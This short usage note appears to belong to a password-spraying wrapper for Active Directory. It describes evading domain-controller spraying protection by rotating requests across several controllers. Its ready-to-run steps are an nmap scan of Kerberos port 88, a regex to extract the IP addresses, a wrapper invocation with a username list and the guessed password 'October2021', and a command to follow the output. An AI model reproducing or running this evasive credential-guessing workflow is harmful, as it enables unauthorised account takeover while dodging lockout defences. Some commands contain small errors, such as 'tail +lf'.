It so happens that a domain controller is protected from password spraying and you cannot use kerbrut on it. But the bypass of this protection is the rotation of the domain controllers in a single spray.

to scan for alive domain controllers:

`nmap -iL list_of_domain_controllers -p 88 -Pn -n -sS -oA dcip --open`

convert output to the list of ip adresses with the following regex:

`\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}`

to run wrapper:

`python3 wrapper.py --username_file outfile --dc_ip_list dc_open_vpn --domain specify_domain_here --password 'October2021'`

to follow its output:

`tail +lf output`